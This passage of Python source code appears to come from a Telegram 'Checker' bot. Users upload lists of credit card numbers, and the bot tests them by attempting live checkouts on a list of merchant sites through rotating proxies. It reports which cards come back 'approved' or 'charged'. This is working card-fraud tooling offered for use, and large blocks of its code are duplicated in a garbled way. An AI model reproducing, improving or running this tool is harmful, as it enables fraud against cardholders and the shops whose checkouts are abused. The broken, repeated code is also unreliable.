                    "progress": (progress_msg.chat_id, progress_msg.message_id),
                    "counts": {
                        "total": self.total,
                        "processed": self.processed,
                        "approved": self.approved,
                        "declined": self.declined,
                        "charged": self.charged,
                        "start_ts": self.start_ts,
                        "title": title,
                    },
                }
        except Exception:
            pass

        try:
            await add_pending(self.batch_id, {
                "batch_id": self.batch_id,
                "user_id": update.effective_user.id,
                "chat_id": update.effective_chat.id,
                "title": title,
                "cards": self.cards,
                "sites": self.sites,
                "send_approved_notifications": self.send_approved_notifications
            })
        except Exception:
            pass

        for t in asyncio.as_completed(tasks):
            if self.cancel_event.is_set():
                try:
                    for p in tasks:
                        if not p.done():
                            p.cancel()
                except Exception:
                    pass
                break
            try:
                card, status, code_display, amount_display, site_label, used_proxy_url, site_url = await t
            except asyncio.CancelledError:
                continue

            if site_url and isinstance(code_display, str):
                error_upper = code_display.upper()
                if "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP" in error_upper:
                    try:
                        checkout.remove_site_from_working_sites(site_url)
                        sites_to_remove.add(site_url)
                        try:
                            logger.info(f"Removed site {site_url} due to currency not supported error")
                        except Exception:
                            pass
                    except Exception:
                        pass

            async with self.lock:
                self.processed += 1
                if status == "charged":
                    self.charged += 1
                elif status == "approved":
                    self.approved += 1
                elif status == "declined":
                    self.declined += 1
                else:
                    self.declined += 1

                try:
                    if self.proxies_list and used_proxy_url:
                        if status == "unknown":
                            msg = (code_display or "").lower() if isinstance(code_display, str) else ""
                            proxy_signals = [
                                "unable to connect to proxy",
                                "proxyerror",
                                "max retries exceeded",
                                "connect timeout",
                                "connection to ",
                                "failed to establish a new connection",
                                "connection refused",
                                "connection timed out",
                            ]
                            is_proxy_failure = any(sig in msg for sig in proxy_signals)
                            if is_proxy_failure:
                                cnt = int(self.per_proxy_unknown.get(used_proxy_url, 0)) + 1
                                self.per_proxy_unknown[used_proxy_url] = cnt
                                if cnt >= 3:
                                    try:
                                        await remove_user_proxy(self.user_id, used_proxy_url)
                                    except Exception:
                                        pass
                                    try:
                                        with self._proxy_idx_lock:
                                            try:
                                                self.proxies_list = [p for p in (self.proxies_list or []) if p != used_proxy_url]
                                            except Exception:
                                                pass
                                    except Exception:
                                        pass
                                    try:
                                        await update.effective_chat.send_message(f"Proxy removed (dead): {_mask_proxy_display(used_proxy_url)}")
                                    except Exception:
                                        pass
                                    if not self.proxies_list:
                                        try:
                                            await clear_user_proxy(self.user_id)
                                        except Exception:
                                            pass
                                        try:
                                            await update.effective_chat.send_message("All proxies dead add a new")
                                        except Exception:
                                            pass
                            else:
                                if used_proxy_url in self.per_proxy_unknown:
                                    self.per_proxy_unknown[used_proxy_url] = 0
                        else:
                            if used_proxy_url in self.per_proxy_unknown:
                                self.per_proxy_unknown[used_proxy_url] = 0
                    elif self.proxies_mapping:
                        if status == "unknown":
                            msg = (code_display or "").lower() if isinstance(code_display, str) else ""
                            proxy_signals = [
                                "unable to connect to proxy",
                                "proxyerror",
                                "max retries exceeded",
                                "connect timeout",
                                "connection to ",
                                "failed to establish a new connection",
                                "connection refused",
                                "connection timed out",
                            ]
                            if any(sig in msg for sig in proxy_signals):
                                self.unknown_streak += 1
                            else:
                                self.unknown_streak = 0
                        else:
                            self.unknown_streak = 0
                        if (self.unknown_streak >= 3) and (not self.proxy_dead_notified):
                            self.proxy_dead_notified = True
                            try:
                                await clear_user_proxy(self.user_id)
                            except Exception:
                                pass
                            self.proxies_mapping = None
                            try:
                                await update.effective_chat.send_message("Proxy is dead add a new")
                            except Exception:
                                pass
                except Exception:
                    pass

                try:
                    user = update.effective_user
                    display_name = (user.full_name or "").strip()
                    if not display_name:
                        uname = (user.username or "").strip()
                        display_name = f"@{uname}" if uname else str(user.id)
                    await inc_user_stats(
                        user_id=user.id,
                        name=display_name,
                        username=user.username,
                        tested=1,
                        approved=1 if status == "approved" else 0,
                        charged=1 if status == "charged" else 0,
                        chat_id=update.effective_chat.id,
                    )
                except Exception:
                    pass

                try:
                    async with ACTIVE_LOCK:
                        rec = ACTIVE_BATCHES.get(self.batch_id)
                        if rec is not None:
                            rec["counts"] = {
                                "total": self.total,
                                "processed": self.processed,
                                "approved": self.approved,
                                "declined": self.declined,
                                "charged": self.charged,
                                "start_ts": self.start_ts,
                                "title": title,
                            }
                            ACTIVE_BATCHES[self.batch_id] = rec
                except Exception:
                    pass

                try:
                    if hasattr(progress_msg, 'chat_id') and hasattr(progress_msg, 'message_id'):
                        await context.bot.edit_message_text(
                            chat_id=progress_msg.chat_id,
                            message_id=progress_msg.message_id,
                            text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True,
                            reply_markup=self.stop_keyboard(),
                        )
                except Exception as e:
                    try:
                        if isinstance(e, RetryAfter):
                            retry_after = e.retry_after
                            logger.warning(f"Flood control hit on progress update, waiting {retry_after} seconds")
                            await asyncio.sleep(retry_after)
                            try:
                                if hasattr(progress_msg, 'chat_id') and hasattr(progress_msg, 'message_id'):
                                    await context.bot.edit_message_text(
                                        chat_id=progress_msg.chat_id,
                                        message_id=progress_msg.message_id,
                                        text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                                        parse_mode=ParseMode.HTML,
                                        disable_web_page_preview=True,
                                        reply_markup=self.stop_keyboard(),
                                    )
                            except Exception:
                                pass
                        else:
                            logger.error(f"Error updating progress: {e}")
                    except Exception:
                        logger.error(f"Failed to update progress after retry: {e}")

        if status in ("approved", "charged"):
            try:
                with APPROVED_FILE_LOCK:
                    display_name = None
                    try:
                        user = update.effective_user
                        display_name = (user.full_name or "").strip()
                        if not display_name:
                            uname = (user.username or "").strip()
                            display_name = f"@{uname}" if uname else str(user.id)
                    except Exception:
                        pass
                    site_display_val = site_label
                    if status == "charged" and isinstance(display_name, str) and display_name.strip():
                        site_display_val = f"{site_label} |  {display_name.strip()}"
                    try:
                        checkout.emit_summary_line(card, code_display, amount_display, site_display=site_display_val)
                    except TypeError:
                        checkout.emit_summary_line(card, code_display, amount_display)
            except Exception:
                pass
            send_chat = (status == "charged") or (status == "approved")
            if send_chat:
                try:
                    await update.effective_chat.send_message(
                        text=result_notify_text(card, status, code_display, amount_display, site_label, display_name),
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                    )
                except Exception as e:
                    try:
                        from telegram.error import RetryAfter
                        if isinstance(e, RetryAfter):
                            retry_after = e.retry_after
                            logger.warning(f"Flood control hit on notification, waiting {retry_after} seconds")
                            await asyncio.sleep(retry_after)
                            await update.effective_chat.send_message(
                                text=result_notify_text(card, status, code_display, amount_display, site_label, display_name),
                                parse_mode=ParseMode.HTML,
                                disable_web_page_preview=True,
                            )
                        else:
                            logger.error(f"Error sending notification: {e}")
                    except Exception:
                        logger.error(f"Failed to send notification after retry: {e}")

        try:
            async with ACTIVE_LOCK:
                ACTIVE_BATCHES.pop(self.batch_id, None)
        except Exception:
            pass
        try:
            await remove_pending(self.batch_id)
        except Exception:
            pass

        cancelled = False
        try:
            cancelled = self.cancel_event.is_set()
        except Exception:
            cancelled = False

        final_text = (
            f"Stopped: {self.processed}/{self.total}\n"
            f"Approved: {self.approved}\nDeclined: {self.declined}\nCharged: {self.charged}"
            if cancelled else
            f"Completed: {self.processed}/{self.total}\n"
            f"Approved: {self.approved}\nDeclined: {self.declined}\nCharged: {self.charged}"
        )
        try:
            await update.effective_chat.send_message(
                text=final_text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
        except Exception as e:
            try:
                from telegram.error import RetryAfter
                if isinstance(e, RetryAfter):
                    retry_after = e.retry_after
                    logger.warning(f"Flood control hit, waiting {retry_after} seconds")
                    await asyncio.sleep(retry_after)
                    await update.effective_chat.send_message(
                        text=final_text,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                    )
                else:
                    logger.error(f"Error sending final message: {e}")
            except Exception:
                logger.error(f"Failed to send final message after retry: {e}")

        tasks = [asyncio.create_task(run_one(card)) for card in self.cards]

        try:
            async with ACTIVE_LOCK:
                ACTIVE_BATCHES[self.batch_id] = {
                    "event": self.cancel_event,
                    "tasks": tasks,
                    "chat_id": self.chat_id,
                    "user_id": self.user_id,
                    "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(self.user_id)),
                    "user_username": getattr(update.effective_user, "username", None),
                    "progress": (progress_msg.chat_id, progress_msg.message_id),
                    "counts": {
                        "total": self.total,
                        "processed": self.processed,
                        "approved": self.approved,
                        "declined": self.declined,
                        "charged": self.charged,
                        "start_ts": self.start_ts,
                        "title": title,
                    },
                }
        except Exception:
            pass

        try:
            await add_pending(self.batch_id, {
                "batch_id": self.batch_id,
                "user_id": update.effective_user.id,
                "chat_id": update.effective_chat.id,
                "title": title,
                "cards": self.cards,
                "sites": self.sites,
                "send_approved_notifications": self.send_approved_notifications
            })
        except Exception:
            pass

        for t in asyncio.as_completed(tasks):
            if self.cancel_event.is_set():
                try:
                    for p in tasks:
                        if not p.done():
                            p.cancel()
                except Exception:
                    pass
                break
            try:
                card, status, code_display, amount_display, site_label, used_proxy_url, site_url = await t
            except asyncio.CancelledError:
                continue

            if site_url and isinstance(code_display, str):
                error_upper = code_display.upper()
                if "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP" in error_upper:
                    try:
                        checkout.remove_site_from_working_sites(site_url)
                        sites_to_remove.add(site_url)
                        try:
                            logger.info(f"Removed site {site_url} due to currency not supported error")
                        except Exception:
                            pass
                    except Exception:
                        pass

            async with self.lock:
                self.processed += 1
                if status == "charged":
                    self.charged += 1
                elif status == "approved":
                    self.approved += 1
                elif status == "declined":
                    self.declined += 1
                else:
                    self.declined += 1

                try:
                    if self.proxies_list and used_proxy_url:
                        if status == "unknown":
                            msg = (code_display or "").lower() if isinstance(code_display, str) else ""
                            proxy_signals = [
                                "unable to connect to proxy",
                                "proxyerror",
                                "max retries exceeded",
                                "connect timeout",
                                "connection to ",
                                "failed to establish a new connection",
                                "connection refused",
                                "connection timed out",
                            ]
                            is_proxy_failure = any(sig in msg for sig in proxy_signals)
                            if is_proxy_failure:
                                cnt = int(self.per_proxy_unknown.get(used_proxy_url, 0)) + 1
                                self.per_proxy_unknown[used_proxy_url] = cnt
                                if cnt >= 3:
                                    try:
                                        await remove_user_proxy(self.user_id, used_proxy_url)
                                    except Exception:
                                        pass
                                    try:
                                        with self._proxy_idx_lock:
                                            try:
                                                self.proxies_list = [p for p in (self.proxies_list or []) if p != used_proxy_url]
                                            except Exception:
                                                pass
                                    except Exception:
                                        pass
                                    try:
                                        await update.effective_chat.send_message(f"Proxy removed (dead): {_mask_proxy_display(used_proxy_url)}")
                                    except Exception:
                                        pass
                                    if not self.proxies_list:
                                        try:
                                            await clear_user_proxy(self.user_id)
                                        except Exception:
                                            pass
                                        try:
                                            await update.effective_chat.send_message("All proxies dead add a new")
                                        except Exception:
                                            pass
                            else:
                                if used_proxy_url in self.per_proxy_unknown:
                                    self.per_proxy_unknown[used_proxy_url] = 0
                        else:
                            if used_proxy_url in self.per_proxy_unknown:
                                self.per_proxy_unknown[used_proxy_url] = 0
                    elif self.proxies_mapping:
                        if status == "unknown":
                            msg = (code_display or "").lower() if isinstance(code_display, str) else ""
                            proxy_signals = [
                                "unable to connect to proxy",
                                "proxyerror",
                                "max retries exceeded",
                                "connect timeout",
                                "connection to ",
                                "failed to establish a new connection",
                                "connection refused",
                                "connection timed out",
                            ]
                            if any(sig in msg for sig in proxy_signals):
                                self.unknown_streak += 1
                            else:
                                self.unknown_streak = 0
                        else:
                            self.unknown_streak = 0
                        if (self.unknown_streak >= 3) and (not self.proxy_dead_notified):
                            self.proxy_dead_notified = True
                            try:
                                await clear_user_proxy(self.user_id)
                            except Exception:
                                pass
                            self.proxies_mapping = None
                            try:
                                await update.effective_chat.send_message("Proxy is dead add a new")
                            except Exception:
                                pass
                except Exception:
                    pass

                try:
                    user = update.effective_user
                    display_name = (user.full_name or "").strip()
                    if not display_name:
                        uname = (user.username or "").strip()
                        display_name = f"@{uname}" if uname else str(user.id)
                    await inc_user_stats(
                        user_id=user.id,
                        name=display_name,
                        username=user.username,
                        tested=1,
                        approved=1 if status == "approved" else 0,
                        charged=1 if status == "charged" else 0,
                        chat_id=update.effective_chat.id,
                    )
                except Exception:
                    pass

                try:
                    async with ACTIVE_LOCK:
                        rec = ACTIVE_BATCHES.get(self.batch_id)
                        if rec is not None:
                            rec["counts"] = {
                                "total": self.total,
                                "processed": self.processed,
                                "approved": self.approved,
                                "declined": self.declined,
                                "charged": self.charged,
                                "start_ts": self.start_ts,
                                "title": title,
                            }
                            ACTIVE_BATCHES[self.batch_id] = rec
                except Exception:
                    pass

                try:
                    await context.bot.edit_message_text(
                        chat_id=progress_msg.chat_id,
                        message_id=progress_msg.message_id,
                        text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                        reply_markup=self.stop_keyboard(),
                    )
                except Exception as e:
                    try:
                        if isinstance(e, RetryAfter):
                            retry_after = e.retry_after
                            logger.warning(f"Flood control hit on progress update, waiting {retry_after} seconds")
                            await asyncio.sleep(retry_after)
                            try:
                                await context.bot.edit_message_text(
                                    chat_id=progress_msg.chat_id,
                                    message_id=progress_msg.message_id,
                                    text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                                    parse_mode=ParseMode.HTML,
                                    disable_web_page_preview=True,
                                    reply_markup=self.stop_keyboard(),
                                )
                            except Exception:
                                pass
                        else:
                            logger.error(f"Error updating progress: {e}")
                    except Exception:
                        logger.error(f"Failed to update progress after retry: {e}")

            if status in ("approved", "charged"):
                try:
                    with APPROVED_FILE_LOCK:
                        display_name = None
                        try:
                            user = update.effective_user
                            display_name = (user.full_name or "").strip()
                            if not display_name:
                                uname = (user.username or "").strip()
                                display_name = f"@{uname}" if uname else str(user.id)
                        except Exception:
                            pass
                        site_display_val = site_label
                        if status == "charged" and isinstance(display_name, str) and display_name.strip():
                            site_display_val = f"{site_label} |  {display_name.strip()}"
                        try:
                            checkout.emit_summary_line(card, code_display, amount_display, site_display=site_display_val)
                        except TypeError:
                            checkout.emit_summary_line(card, code_display, amount_display)
                except Exception:
                    pass
                send_chat = (status == "charged") or (status == "approved")
                if send_chat:
                    try:
                        await update.effective_chat.send_message(
                            text=result_notify_text(card, status, code_display, amount_display, site_label, display_name),
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True,
                        )
                    except Exception as e:
                        try:
                            from telegram.error import RetryAfter
                            if isinstance(e, RetryAfter):
                                retry_after = e.retry_after
                                logger.warning(f"Flood control hit on notification, waiting {retry_after} seconds")
                                await asyncio.sleep(retry_after)
                                await update.effective_chat.send_message(
                                    text=result_notify_text(card, status, code_display, amount_display, site_label, display_name),
                                    parse_mode=ParseMode.HTML,
                                    disable_web_page_preview=True,
                                )
                            else:
                                logger.error(f"Error sending notification: {e}")
                        except Exception:
                            logger.error(f"Failed to send notification after retry: {e}")

        try:
            async with ACTIVE_LOCK:
                ACTIVE_BATCHES.pop(self.batch_id, None)
        except Exception:
            pass
        try:
            await remove_pending(self.batch_id)
        except Exception:
            pass

        cancelled = False
        try:
            cancelled = self.cancel_event.is_set()
        except Exception:
            cancelled = False

        final_text = (
            f"Stopped: {self.processed}/{self.total}\n"
            f"Approved: {self.approved}\nDeclined: {self.declined}\nCharged: {self.charged}"
            if cancelled else
            f"Completed: {self.processed}/{self.total}\n"
            f"Approved: {self.approved}\nDeclined: {self.declined}\nCharged: {self.charged}"
        )
        try:
            await update.effective_chat.send_message(
                text=final_text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
        except Exception as e:
            try:
                from telegram.error import RetryAfter
                if isinstance(e, RetryAfter):
                    retry_after = e.retry_after
                    logger.warning(f"Flood control hit, waiting {retry_after} seconds")
                    await asyncio.sleep(retry_after)
                    await update.effective_chat.send_message(
                        text=final_text,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                    )
                else:
                    logger.error(f"Error sending final message: {e}")
            except Exception:
                logger.error(f"Failed to send final message after retry: {e}")


def mask_proxy_password(proxy_url: str) -> str:
    try:
        if not proxy_url or ":" not in proxy_url:
            return proxy_url
        
        if "//" in proxy_url:
            if "@" in proxy_url:
                prefix, rest = proxy_url.rsplit("@", 1)
                if ":" in prefix:
                    parts = prefix.split(":")
                    if len(parts) >= 2:
                        return f"{':'.join(parts[:-1])}:****@{rest}"
            return proxy_url
            
        parts = proxy_url.split(":")
        if len(parts) >= 4:
            return f"{':'.join(parts[:-1])}:****"
            
        return proxy_url
    except Exception:
        return proxy_url

async def get_user_proxy_info(user_id: int) -> Optional[Tuple[str, str, str]]:
    uid = str(int(user_id))
    async with PROXIES_LOCK:
        recs = _read_proxy_records()
        for (u, name, username, proxy, _) in recs:
            if u == uid:
                return (proxy, name, username)
    return None

async def cmd_show(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return

    user = update.effective_user
    args = context.args or []
    
    if args:
        if not is_admin(user.id):
            await update.message.reply_text("Only admins can check other users' proxies.")
            return
            
        try:
            target_id = int(args[0])
            proxy_info = await get_user_proxy_info(target_id)
            if not proxy_info:
                await update.message.reply_text(f"No proxy found for user {target_id}.")
                return
                
            proxy_url, name, username = proxy_info
            masked_proxy = mask_proxy_password(proxy_url)
            msg = f"Proxy for user {target_id}"
            if name:
                msg += f" ({name})"
            if username:
                msg += f" @{username}"
            msg += f":\n{masked_proxy}"
            
            await update.message.reply_text(msg)
            
        except ValueError:
            await update.message.reply_text("Invalid user ID. Usage: /show <user_id>")
            return
            
    else:
        try:
            saved = await get_user_proxies(user.id)
        except Exception:
            saved = []

        if not saved:
            await update.message.reply_text("You don't have any proxy set. Use /setpr to set one.")
            return

        lines = []
        for i, p in enumerate(saved, 1):
            try:
                lines.append(f"{i}. {mask_proxy_password(p)}")
            except Exception:
                lines.append(f"{i}. {p}")

        msg = f"You have {len(saved)} proxy(ies) configured:\n" + "\n".join(lines)
        msg += "\n\nThese proxies will be used in a round-robin fashion when you run checks."
        await update.message.reply_text(msg)

GLOBAL_EXECUTOR = ThreadPoolExecutor(max_workers=GLOBAL_MAX_WORKERS)
SMALL_BATCH_THRESHOLD = 6
SMALL_TASK_EXECUTOR = ThreadPoolExecutor(max_workers=12)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    await update.message.reply_text(
        "💳 Checker\n"
        "Commands:\n"
        "• /start — Show this help\n"
        "• /txt — Reply to a .txt file containing CCs to start checking\n"
        "• /sh — Check inline CCs (up to 100)\n"
        "• /st <card> — Check a single or multiple credit cards (max 25)\n"
        "• /setpr <proxy> — Set Proxy 1 or more\n"
        "• /show — Show your current proxy\n"
        "• /stop — Stop your running batch\n"
        "• /site — Show number of active sites\n"
        "• /me — Show your personal stats\n"
        "• /active — Show current active checks\n\n"
        "⌥ Dev: https://t.me/Iam_stillnobody"
    )


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    ensure_uploads_dir()
    doc: Document = update.message.document
    if not doc or not (doc.file_name or "").lower().endswith(".txt"):
        await update.message.reply_text("Please send a .txt file.")
        return

    try:
        file = await context.bot.get_file(doc.file_id)
        prefix = _username_prefix_for_file(update.effective_user)
        ts = int(time.time())
        local_path = os.path.join(UPLOADS_DIR, f"{prefix}_{update.effective_user.id}_{ts}_{doc.file_name}")
        await file.download_to_drive(custom_path=local_path)
        context.chat_data["last_txt_path"] = local_path
        await update.message.reply_text(f"File received. Reply to this file with /txt to start checking.")
    except Exception as e:
        await update.message.reply_text(f"Failed to download file: {e}")


async def cmd_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    replied = update.message.reply_to_message
    txt_path = None
    if replied and replied.document and (replied.document.file_name or "").lower().endswith(".txt"):
        try:
            file = await context.bot.get_file(replied.document.file_id)
            ensure_uploads_dir()
            prefix = _username_prefix_for_file(update.effective_user)
            ts = int(time.time())
            local_path = os.path.join(UPLOADS_DIR, f"{prefix}_{update.effective_user.id}_{ts}_{replied.document.file_name}")
            await file.download_to_drive(custom_path=local_path)
            txt_path = local_path
        except Exception:
            txt_path = context.chat_data.get("last_txt_path")
    else:
        txt_path = context.chat_data.get("last_txt_path")

    if not txt_path or not os.path.exists(txt_path):
        await update.message.reply_text("No .txt file found. Please send a .txt file and reply with /txt.")
        return

    cards = parse_cards_from_file(txt_path)
    if not cards:
        await update.message.reply_text("No valid CC entries found in the file.")
        return

    sites = checkout.read_sites_from_file("working_sites.txt")
    if not sites:
        await update.message.reply_text("No sites found in working_sites.txt.")
        return

    context.chat_data["pending_cards"] = cards
    context.chat_data["pending_sites"] = sites
    context.chat_data["pending_title"] = "File Batch"

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Yes", callback_data="PREF_APPROVED:YES")],
        [InlineKeyboardButton("No", callback_data="PREF_APPROVED:NO")],
    ])
    await update.message.reply_text(
        "Do you want Approved CC in txt?\nChoose Yes to receive Approved CCs in chat.\nChoose No to only receive Charged CC.",
        reply_markup=keyboard
    )


async def cmd_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    full_text = (update.message.text or "").strip()
    body = ""

    try:
        if full_text.lower().startswith("/mass"):
            body = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        body = ""

    if not body:
        parts = full_text.split("\n", 1)
        if len(parts) >= 2 and parts[1].strip():
            body = parts[1].strip()

    if not body:
        replied = update.message.reply_to_message
        if replied and isinstance(getattr(replied, "text", None), str) and replied.text.strip():
            body = replied.text.strip()

    if not body:
        await update.message.reply_text("Usage:\n/mass <single CC or multiline CCs>")
        return

    def _normalize_proxy_url_inline(p: Optional[str]) -> Optional[str]:
        try:
            if not p:
                return None
            s = p.strip()
            if not s or s.startswith("#"):
                return None
            lower = s.lower()
            if lower.startswith(("http://", "https://", "socks5://", "socks5h://")):
                return s
            parts = s.split(":")
            if len(parts) >= 4:
                host = parts[0]
                port = parts[1]
                user = ":".join(parts[2:-1]) if len(parts) > 4 else parts[2]
                pwd = parts[-1]
                try:
                    from urllib.parse import quote as _q
                except Exception:
                    def _q(x, safe=""):
                        return x
                user_enc = _q(user, safe="")
                pwd_enc = _q(pwd, safe="")
                return f"http://{user_enc}:{pwd_enc}@{host}:{port}"
            return f"http://{s}"
        except Exception:
            return None

    def _extract_proxy_from_text_inline(text: str) -> Tuple[Optional[str], str]:
        try:
            lines = (text or "").splitlines()
        except Exception:
            return None, text
        proxy_raw = None
        remaining = []
        for ln in lines:
            s = (ln or "").strip()
            low = s.lower()
            if low.startswith("proxy=") or low.startswith("proxy:") or low.startswith("proxy "):
                proxy_raw = s.split("=",1)[1].strip() if "=" in s else s.split(":",1)[1].strip() if ":" in s else s.split(" ",1)[1].strip() if " " in s else ""
                continue
            if low.startswith("px=") or low.startswith("px:") or low.startswith("px "):
                proxy_raw = s.split("=",1)[1].strip() if "=" in s else s.split(":",1)[1].strip() if ":" in s else s.split(" ",1)[1].strip() if " " in s else ""
                continue
            remaining.append(ln)
        return (proxy_raw if proxy_raw else None), "\n".join(remaining)

    proxy_candidate_raw, body_clean = _extract_proxy_from_text_inline(body)
    cards = parse_cards_from_text(body_clean)
    if not cards:
        await update.message.reply_text("No valid CC entries provided.")
        return

    orig_total = len(cards)
    if orig_total > 100:
        await update.message.reply_text(f"Limit is 100 CC for /sh. Received {orig_total}, processing first 100.")
        cards = cards[:100]

    sites = checkout.read_sites_from_file("working_sites.txt")
    if not sites:
        await update.message.reply_text("No sites found in working_sites.txt.")
        return

    proxies_override = None
    try:
        saved_list = await get_user_proxies(update.effective_user.id)
        if isinstance(saved_list, list) and len(saved_list) > 0:
            proxies_override = list(saved_list)
            try:
                pass
            except Exception:
                pass
    except Exception:
        pass
    if proxy_candidate_raw:
        normalized_proxy = _normalize_proxy_url_inline(proxy_candidate_raw)
        if not normalized_proxy:
            try:
                await update.message.reply_text("Provided proxy format is invalid. Expected host:port or user:pass@host:port (scheme optional). Proceeding without it.")
            except Exception:
                pass
        else:
            try:
                loop = asyncio.get_running_loop()
                test_result = await loop.run_in_executor(
                    GLOBAL_EXECUTOR,
                    check_single_card,
                    cards[0],
                    list(sites),
                    {"http": normalized_proxy, "https": normalized_proxy}
                )
                status, code_display, amount_display, site_label, used_proxy_url, site_url = test_result
            except Exception:
                status = "unknown"
                code_display = '"code": "UNKNOWN"'
                amount_display = "$0"
                site_label = ""
                used_proxy_url = None
                site_url = None

            if status != "unknown":
                proxies_override = {"http": normalized_proxy, "https": normalized_proxy}
                try:
                    user = update.effective_user
                    display_name = (user.full_name or "").strip()
                    if not display_name:
                        uname = (user.username or "").strip()
                        display_name = f"@{uname}" if uname else str(user.id)
                    existing = await get_user_proxies(user.id)
                    if isinstance(existing, list) and (normalized_proxy in existing):
                        await update.message.reply_text("Proxy Already Added")
                    else:
                        await add_user_proxy(user.id, display_name, user.username, normalized_proxy)
                        await update.message.reply_text("Added 1 Proxy")
                except Exception:
                    pass
            else:
                try:
                    await update.message.reply_text("Proxy Dead")
                except Exception:
                    pass

    batch_id = f"{update.effective_chat.id}:{int(time.time())}"
    cancel_event = asyncio.Event()
    runner = BatchRunner(cards, sites, GLOBAL_EXECUTOR, batch_id, update.effective_chat.id, update.effective_user.id, cancel_event, proxies_override=proxies_override)
    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES[batch_id] = {
                "event": cancel_event,
                "tasks": [],
                "chat_id": update.effective_chat.id,
                "user_id": update.effective_user.id,
                "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(update.effective_user.id)),
                "user_username": getattr(update.effective_user, "username", None),
                "progress": (None, None),
                "counts": {
                    "total": len(cards),
                    "processed": 0,
                    "approved": 0,
                    "declined": 0,
                    "charged": 0,
                    "start_ts": runner.start_ts,
                    "title": "SH Batch",
                },
            }
    except Exception:
        pass
    try:
        await add_pending(batch_id, {
            "batch_id": batch_id,
            "user_id": update.effective_user.id,
            "chat_id": update.effective_chat.id,
            "title": "SH Batch",
            "cards": cards,
            "sites": sites,
            "send_approved_notifications": True
        })
    except Exception:
        pass
    context.application.create_task(runner.run_with_notifications(update, context, title="SH Batch"))


async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    full_text = (update.message.text or "").strip()
    body = ""

    try:
        if full_text.lower().startswith("/sh"):
            body = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        body = ""

    if not body:
        parts = full_text.split("\n", 1)
        if len(parts) >= 2 and parts[1].strip():
            body = parts[1].strip()

    if not body:
        replied = update.message.reply_to_message
        if replied and isinstance(getattr(replied, "text", None), str) and replied.text.strip():
            body = replied.text.strip()

    if not body:
        await update.message.reply_text("Usage:\n/sh <single CC or multiline CCs>")
        return

    def _normalize_proxy_url_inline(p: Optional[str]) -> Optional[str]:
        try:
            if not p:
                return None
            s = p.strip()
            if not s or s.startswith("#"):
                return None
            lower = s.lower()
            if lower.startswith(("http://", "https://", "socks5://", "socks5h://")):
                return s
            parts = s.split(":")
            if len(parts) >= 4:
                host = parts[0]
                port = parts[1]
                user = ":".join(parts[2:-1]) if len(parts) > 4 else parts[2]
                pwd = parts[-1]
                try:
                    from urllib.parse import quote as _q
                except Exception:
                    def _q(x, safe=""):
                        return x
                user_enc = _q(user, safe="")
                pwd_enc = _q(pwd, safe="")
                return f"http://{user_enc}:{pwd_enc}@{host}:{port}"
            return f"http://{s}"
        except Exception:
            return None

    def _extract_proxy_from_text_inline(text: str) -> Tuple[Optional[str], str]:
        try:
            lines = (text or "").splitlines()
        except Exception:
            return None, text
        proxy_raw = None
        remaining = []
        for ln in lines:
            s = (ln or "").strip()
            low = s.lower()
            if low.startswith("proxy=") or low.startswith("proxy:") or low.startswith("proxy "):
                proxy_raw = s.split("=",1)[1].strip() if "=" in s else s.split(":",1)[1].strip() if ":" in s else s.split(" ",1)[1].strip() if " " in s else ""
                continue
            if low.startswith("px=") or low.startswith("px:") or low.startswith("px "):
                proxy_raw = s.split("=",1)[1].strip() if "=" in s else s.split(":",1)[1].strip() if ":" in s else s.split(" ",1)[1].strip() if " " in s else ""
                continue
            remaining.append(ln)
        return (proxy_raw if proxy_raw else None), "\n".join(remaining)

    proxy_candidate_raw, body_clean = _extract_proxy_from_text_inline(body)
    cards = parse_cards_from_text(body_clean)
    if not cards:
        await update.message.reply_text("No valid CC entries provided.")
        return

    orig_total = len(cards)
    if orig_total > 100:
        await update.message.reply_text(f"Limit is 100 CC for /sh. Received {orig_total}, processing first 100.")
        cards = cards[:100]

    sites = checkout.read_sites_from_file("working_sites.txt")
    if not sites:
        await update.message.reply_text("No sites found in working_sites.txt.")
        return

    proxies_override = None
    try:
        saved_list = await get_user_proxies(update.effective_user.id)
        if isinstance(saved_list, list) and len(saved_list) > 0:
            proxies_override = list(saved_list)
            try:
                if len(saved_list) == 1:
                    await update.message.reply_text(f"Using your saved proxy: {_mask_proxy_display(saved_list[0])}")
                else:
                    first = _mask_proxy_display(saved_list[0])
                    await update.message.reply_text(f"Using your saved proxies ({len(saved_list)}): {first} (+{len(saved_list)-1} more)")
            except Exception:
                pass
    except Exception:
        pass
    if proxy_candidate_raw:
        normalized_proxy = _normalize_proxy_url_inline(proxy_candidate_raw)
        if not normalized_proxy:
            try:
                await update.message.reply_text("Provided proxy format is invalid. Expected host:port or user:pass@host:port (scheme optional). Proceeding without it.")
            except Exception:
                pass
        else:
            try:
                loop = asyncio.get_running_loop()
                test_result = await loop.run_in_executor(
